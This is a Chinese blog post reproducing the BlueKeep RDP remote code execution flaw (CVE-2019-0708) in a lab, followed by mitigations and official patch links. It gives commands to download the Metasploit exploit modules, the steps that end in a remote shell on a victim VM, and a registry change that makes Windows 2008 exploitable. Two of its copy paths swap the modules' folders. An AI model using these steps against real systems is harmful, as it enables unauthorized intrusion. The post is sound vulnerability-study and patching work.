# [Shell]CVE-2019-0708漏洞复现及修复补丁 - 肖洋肖恩、 - 博客园

> 原文：[https://www.cnblogs.com/-mo-/p/11483820.html](https://www.cnblogs.com/-mo-/p/11483820.html)

### 0x01 漏洞原理

Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广，windows2003、windows2008、windows2008 R2、windows 7系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的。

这个漏洞是今年来说危害严重性最大的漏洞，跟之前的勒索，永恒之蓝病毒差不多。

CVE-2019-0708漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。如果被攻击者利用，会导致服务器入侵，中病毒，像WannaCry 永恒之蓝漏洞一样大规模的感染。

2019年9月7日晚上凌晨1点左右，metaspolit更新了漏洞利用程序

未经身份验证的攻击者利用该漏洞，向目标Windows主机发送恶意构造请求，可以在目标系统上执行任意代码。

### 0x02 受影响版本

```
Windows 7

Windows Server 2008 R2

Windows Server 2008

Windows Server 2003 
```

![](../Images/5561bdedc6b81cc78c3b4ee890a706c5.png)

我在复现的时候只有`win7 sp1`与`Windows 2008 sp1`可以复现成功，其它的要么就是打到蓝屏，要么就是打到ruby重置连接。

`Windows 2008 sp1`需要修改注册表[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\rdpwd\fDisableCam]值修改为0

### 0x03 复现准备

攻击工具准备

1.使用如下命令一键安装metasploit-framework

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall 
```

2.下载exp利用脚本

```
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb 
```

3.将下载好的攻击套件放置到msf的相应文件夹(如果已存在同名文件,直接覆盖即可。如果么有相应的文件夹，mkdir一下就好了)

```
cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/

cp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/

cp cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/

cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/ 
```

4.使用msfconsole进入metasploit-framework。使用reload_all重新加载0708rdp利用模块

### 0x04 漏洞复现

1.  use

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce 
```

启用0708RDP攻击模块

2.info
![](../Images/94b52f648d43068bccd0ad21b57b769a.png)

可见关键设置主要为RHOSTS\ RPORT \ target

3.set

其中RDP_CLIENT_IP为已经连接上要攻击的服务器的客户端ip地址

使用set RHOSTS 受害机IP设置受害机IP
使用set RPORT 受害机PORT设置受害机RDP端口号
使用set target ID数字(可选为0-4)设置受害机机器架构

这里我们使用的是VMware Fusion,那么target 3满足条件
使用exploit开始攻击,等待建立连接

![](../Images/1b53380ef765632bb8b0322fb81ef9b2.png)

4.shell
成功建立连接，获取到shell
![](../Images/6d4fc682f8c0ce043692181cf7970028.png)

### 0x05 修复补丁以及安全建议

有些windows2008系统打不了补丁的一般是数据中心版本，可以设置一下服务器，计算机右键属性-远程设置-仅允许运行使用网络基本身份验证的远程桌面的计算机连接（更安全）（N），在这行点勾，然后确认即可，可以临时的防止漏洞的攻击。

如果对补丁不知道该如何修复的，可以启用阿里云的端口安全策略，禁止掉3389远程端口，只允许自己的IP通信即可。

1.Windows Server 2008 漏洞补丁系列下载地址

```
Windows Server 2008 32位系统:

http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu

Windows Server 2008 x64位系统:

http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu

Windows Server 2008 R2 Itanium系统:

http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu

Windows Server 2008 R2 x64系统:

http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu

Windows Server 2008 Itanium:

http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu 
```

2.Windows Server 2003 漏洞补丁系列下载地址

```
Windows Server 2003 32位系统:

http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe

Windows Server 2003 64位系统:

http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe 
```

3.Windows XP 漏洞补丁系列下载地址

```
Windows XP SP3 32位系统:

http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe

Windows XP SP2 64位系统:

http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe

Windows XP SP3 for XPe:

http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe 
```

### 0x06 参考链接

[https://github.com/rapid7/metasploit-framework/pull/12283/files](https://github.com/rapid7/metasploit-framework/pull/12283/files)

[http://blog.xkkhh.cn/archives/535](http://blog.xkkhh.cn/archives/535)

[https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage](https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage)